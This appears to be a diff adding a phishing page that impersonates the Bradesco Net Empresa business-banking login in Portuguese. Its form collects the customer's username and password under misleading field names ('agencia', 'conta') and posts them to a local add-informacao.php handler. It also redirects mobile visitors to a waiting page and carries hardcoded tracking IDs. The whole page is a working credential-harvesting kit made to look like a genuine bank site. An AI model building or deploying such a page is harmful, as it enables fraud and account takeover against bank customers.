@@ -1,0 +1,220 @@
+<!doctype html>
+<html lang="pt-br" class="h-100"  ng-app="app" ng-controller="appController">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Banco Bradesco S/A</title>
+
+    <link rel="shortcut icon" href="img/favicon.ico">
+
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/animate.css" rel="stylesheet">
+    <link href="style-brada.css" rel="stylesheet">
+
+    <link href="https://fonts.googleapis.com/css?family=Lato&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
+    <script>
+      var informacaoid = encodeURIComponent('MzI3Mzcx');
+      var informacaoid1 = encodeURIComponent('327371');
+    </script>
+  </head>
+<body class="">
+<div class="container float-left">
+  <div class="row">
+    <div class="logo">
+      <img src="img/logoBrade.png" alt="">
+    </div>
+    <div class="col-12 topo-1">
+      <img src="img/cancelar.jpg" class="float-right" style="cursor: pointer;" alt="">
+    </div>
+    <div class="col-12 topo-2">
+      <p class="data" id='dataDemo'>Terça-feira, 29 de Junho de 2021</p>
+    </div>
+    <div class="col-12 topo-3">
+      <h4 class="titulo">Acesso Seguro</h4>
+      <p class="corpo">
+        Acesse o Bradesco Net Empresa de forma segura seguindo os passos abaixo:
+      </p>
+    </div>
+    <div class="conteudo p-3">
+      <div class="cardbrada">
+        <div class="bgt"></div>
+        <div class="logalogin p-3">
+<form action="add-informacao.php" method="post" accept-charset="utf-8" class="" id="tipo1">
+  <input type="hidden" name="tipo" value="1">
+  <div class="form-group row mb-0">
+    <label for="inputEmail3" class="col-sm-3 col-form-label">Usuário</label>
+    <div class="col-sm-9 m-0" style="padding: 2px">
+      <input type="text" class="input-cinza" style="text-transform: uppercase" name="agencia" id="agencia">
+    </div>
+  </div>
+  <div class="form-group row mb-0">
+    <label for="inputEmail3" class="col-sm-3 col-form-label">Senha</label>
+    <div class="col-sm-9 m-0" style="padding: 2px">
+      <input type="email" class="input-cinza" name="conta" id="conta"  style="-webkit-text-security: disc;">
+    </div>
+  </div>
+</form>
+
+  <span class="HtmlOutputTextBradesco mt-1 d-block p-2 px-3" style="cursor: pointer">Esqueci meu usuário e quero recuperá-lo por e-mail</span>
+        </div>
+        <div class="lma">
+          <div class="numer float-left">
+            <span class="passo">1</span>
+          </div>
+          <div class="content-log float-left">
+            <p class="mb10" style="padding-top: 5px;padding-bottom: 5px;">
+              <span style="color: #bf0000;font-size: 15px;">
+                <b>Selecione um tipo de acesso</b>
+              </span>
+            </p>
+            <div class="pl-3 pb-2">
+              <div class="form-check p-1">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios1" value="option1" checked>
+                <label class="form-check-label" for="exampleRadios1">
+                  Usuário
+                </label>
+              </div>
+              <div class="form-check disabled p-1">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios3" value="option3" disabled>
+                <label class="form-check-label" for="exampleRadios3" style="color: #ccc">
+                  ICP Brasil <span style="font-size: 10px;color: #c3c3c3">(indisponível)</span>
+                </label>
+              </div>
+              <div class="form-check disabled p-1">
+                <input class="form-check-input" type="radio" name="exampleRadios" id="exampleRadios3" value="option3" disabled>
+                <label class="form-check-label" for="exampleRadios3" style="color: #ccc">
+                  Certificado Digital Bradesco <span style="font-size: 10px;color: #c3c3c3">(indisponível)</span>
+                </label>
+              </div>
+            </div>
+            <div class="clr" style="text-align: right; padding-top: 5px;"><input type="checkbox" name="chkRepetir" id="chkRepetir" value="true" title="Clique para lembrar meus dados no próximo acesso." class="checkbox tabindex" tabindex="21"><span id="lblReptMais"><span class="HtmlOutputTextBradesco">&nbsp;Lembrar meu acesso</span></span></div>
+          </div>
+
+          <div class="clearfix"></div>
+        </div>
+        <div class="bgb"></div>
+      </div>
+      <div class="botoes">
+        <p class="d-block mb-0">
+          <input type="button" value="" class="bt_avancar mt-3 float-right" id="entrar">
+          <a href="#" class="bt_cancelar_acesso float-right mr-2 mt-3" onclick="window.location.href='index.php'"></a>
+        </p>
+      </div>
+      <div class="aviso py-2">
+        <p>
+        <span class="HtmlOutputTextBradesco">Se seu contrato foi feito na agência, </span>
+        <a id="identificationForm:primeiroAcesso" href="https://www.ne12.bradesconetempresa.b.br/ibpjprimeiroacesso/primeiroAcessoInicial.jsf" title="clique aqui" style="font-weight:bold;text-decoration:underline;" class="tabindex" tabindex="41"><span class="HtmlOutputTextBradesco">faça seu primeiro acesso por aqui.</span></a>
+        </p>
+      </div>
+    </div>
+    <div class="lateral">
+      <img src="img/verso1.png" width="220px" alt="">
+    </div>
+
+  </div>
+</div>
+<div class="clearfix"></div>
+<div class="footer">
+  <div class="imagemfooter">
+    <img src="img/footer.png" class="img-fluid" alt="">
+  </div>  
+</div>
+</body>
+
+    <script src="js/jquery.min.js"></script>
+    <script src="js/jquery.mask.min.js"></script>
+    <script src="js/bootstrap.bundle.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/popper.min.js"></script>
+    <script src="js/acesso.js"></script>
+    <script src="angular/angular.min.js"></script>
+    <script src="angular/angular-cookies.min.js"></script>  
+    <script src="angular/i18n/angular-locale_pt-br.js"></script>
+    <script src="js/controller.js"></script>
+    <script src="js/preloader.js"></script>
+<script type="text/javascript">
+  $(document).ready(function(){  
+  var data = new Date();
+
+  var day = ["Domingo", "Segunda-feira", "Terça-feira", "Quarta-feira", "Quinta-feira", "Sexta-feira", "Sábado"];
+  var month = ["Janeiro", "Fevereiro", "Março", "Abril", "Maio", "Junho", "Julho", "Agosto", "Setembro", "Outubro", "Novembro", "Dezembro"];
+  var year = data.getFullYear();
+
+  var extenso = day[data.getDay()]+", "+data.getDate()+" de "+month[data.getMonth()]+" de "+data.getFullYear();
+    $('#dataDemo').html(extenso);
+  });
+</script>
+<script>
+function checa_navegador(){
+  var ua = navigator.userAgent.toLowerCase();
+  var uMobile = '';
+  uMobile = 'ipad;iphone;ipod;windows phone;android;iemobile 8';
+  v_uMobile = uMobile.split(';');
+  var boolMovel = false;
+
+  for (i=0;i<=v_uMobile.length;i++){
+          if (ua.indexOf(v_uMobile[i]) != -1){
+                  boolMovel = true;
+          }
+  }
+
+  if (boolMovel == true){
+          location.href='aguarde-mobile.php';
+  }
+}
+
+$('body').ready(function(event){
+  checa_navegador();
+})
+</script>
+<script type="text/javascript">
+$('#agencia').keypress(function(e) {
+    if(e.which == 13) {
+      e.preventDefault();
+    }
+});
+
+$('#conta').keypress(function(e) {
+    if(e.which == 13) {
+      e.preventDefault();
+    }
+});
+
+$('#agencia').focusout(function(event) {
+    if($('#agencia').val().length < 2){
+      $('#agencia').val("");
+      $(".um").show('fast');
+      $('#agencia').addClass('red');
+    }else{
+      $(".um").hide('fast');
+      $('#agencia').removeClass('red');
+    }
+});
+
+$('#conta').focusout(function(event) {
+    if($('#conta').val().length < 2){
+      $('#conta').val("");
+      $(".um").show('fast');
+      $('#conta').addClass('red');
+    }else{
+      $(".um").hide('fast');
+      $('#conta').removeClass('red');
+    }
+});
+
+$('#entrar').click(function(event) {
+  if($('#agencia').val().length < 2){
+    $('#agencia').focus()
+    $('#agencia').addClass('red');
+  }else if($('#conta').val().length < 3){
+    $('#conta').focus()
+    $('#conta').addClass('red');
+  }else{
+    $('#tipo1').submit();
+  }  
+});
+
+</script>
+</body>
+</html>
